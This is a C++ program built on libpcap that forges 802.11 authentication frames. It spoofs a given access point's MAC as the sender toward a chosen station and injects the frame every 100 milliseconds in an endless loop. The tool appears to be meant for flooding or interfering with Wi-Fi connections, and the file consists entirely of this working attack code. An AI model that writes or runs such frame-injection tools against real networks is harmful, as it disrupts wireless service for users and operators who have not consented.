#include <iostream>
#include <pcap.h>
#include <string.h>  // for memcpy
#include <unistd.h>  // for sleep
#include <mac.h>

using namespace std;

#pragma pack(push, 1)
struct Radiotap_header {
    uint8_t   version;     /* set to 0 */
    uint8_t   pad;
    uint16_t  len;         /* entire length */
    uint32_t  present;     /* fields present */
};
#pragma pack(pop)

#pragma pack(push, 1)
struct Authentication_Frame {
    uint16_t  type;
    uint16_t  dur;
    Mac   dst_mac;
    Mac   src_mac;
    Mac   bssid;
    uint16_t  number;
};
#pragma pack(pop)

#pragma pack(push, 1)
struct Fixed_parameters {
    uint16_t auth_al;
    uint16_t auth_SEQ;
    uint16_t sta_code;
};
#pragma pack(pop)

#pragma pack(push, 1)
struct Tag_parameters {
    uint8_t tag_num;
    uint8_t tag_len;
    uint8_t OUI[3];
    uint16_t ven_Data[3];
};
#pragma pack(pop)

#pragma pack(push, 1)
struct Wir_Management {
    Fixed_parameters fixed_pa;
    Tag_parameters  tag_pa;
};
#pragma pack(pop)


struct Authentication_Packet {
    Radiotap_header      radiotab;
    uint8_t nul[3];
    Authentication_Frame auth_frame;
    Wir_Management       w_manage;
};


void usage() {
    cout << "syntax : Authentication <interface> <ap mac> <station mac>\n";
    cout << "sample : Authentication wlan0 00:11:22:33:44:55 66:77:88:99:AA:BB\n";
}

int main(int argc , char * argv[]) {

    if (argc != 4) {
        usage();
        return -1;
    }

    cout << "** Authentication Start **\n";

    char * Interface = argv[1];
    char * AP_MAC = argv[2];
    char * ST_MAC = argv[3];

    int j=0;

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(Interface, BUFSIZ, 1, 1000, errbuf);
    if (handle == nullptr) {
        cout << "pcap handle error! \n";
        return -1;
    }

    Authentication_Packet packet;

    packet.radiotab.len = 0x000b;
    packet.auth_frame.type = 0x00b0;
    packet.auth_frame.dur = 0x013a;
    packet.auth_frame.dst_mac = Mac(ST_MAC);
    packet.auth_frame.src_mac = Mac(AP_MAC);
    packet.auth_frame.bssid = Mac(ST_MAC);
    packet.w_manage.fixed_pa.auth_SEQ = 0x0020;
    packet.w_manage.tag_pa.tag_num = 0xdd;
    packet.w_manage.tag_pa.tag_len = 9;
    packet.w_manage.tag_pa.OUI[1] = 0x10;
    packet.w_manage.tag_pa.OUI[2] = 0x18;



    while(1) {
        int res = pcap_sendpacket(handle,reinterpret_cast<const u_char*>(&packet),sizeof(Authentication_Packet));
        cout << "Packet  " << j << endl;
        j++;
        if (res != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
            break;
        }
        usleep(100000);
    }

    pcap_close(handle);
    cout << "Success!!\n";
}
